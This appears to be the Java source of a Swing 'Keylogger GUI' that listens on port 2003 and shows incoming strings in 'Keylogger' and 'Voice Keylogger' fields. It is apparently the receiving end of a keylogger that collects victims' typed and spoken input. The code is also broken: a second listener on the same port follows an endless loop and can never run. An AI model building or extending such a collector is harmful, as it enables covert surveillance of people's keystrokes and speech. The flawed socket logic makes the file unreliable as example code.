	import java.awt.*;
import java.io.DataInputStream;
import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;

import javax.swing.*;

    public class View
    {



        JTextField textField;
        JTextField textField1;
        JLabel text = new JLabel("Keylogger_");
        JLabel text1 = new JLabel("Voice Keylogger");
        JFrame frame;
        JPanel firstPanel = new JPanel();
        JPanel secondPanel = new JPanel();


        View()
        {
            frame = new JFrame("Keylogger GUI");
            frame.setSize(1200,500);
            frame.setLayout(new GridLayout(2,1));
            frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
            frame.setLocationRelativeTo(null);

            textField = new JTextField(100);
            textField1 = new JTextField(100);
            intialisation();


        }
        public void intialisation(){
            textField.setPreferredSize(new Dimension(100,200));
            textField1.setPreferredSize(new Dimension(100,200));
            firstPanel.setLayout(new FlowLayout());
            firstPanel.add(text);
            firstPanel.add(textField);
            frame.add(firstPanel);
            secondPanel.add(text1);
            secondPanel.add(textField1);
            frame.add(secondPanel);
            frame.setResizable(false);
            frame.setVisible(true);
            
       


    
      try {
      ServerSocket ss = new ServerSocket(2003);
      while(true) {
      Socket s = ss.accept();
      
  
      DataInputStream dis=new DataInputStream(s.getInputStream());

      textField.setText(textField.getText() + dis.readUTF());

      }
      } catch (IOException ie) {
        ie.printStackTrace();
      }
 
      try {
      ServerSocket s2 = new ServerSocket(2003);
      while(true) {
      Socket s1 = s2.accept();
      
  
      DataInputStream dis=new DataInputStream(s1.getInputStream());

      textField1.setText(textField1.getText() + dis.readUTF());

      }
      } catch (IOException ie) {
        ie.printStackTrace();
      }



    }
}

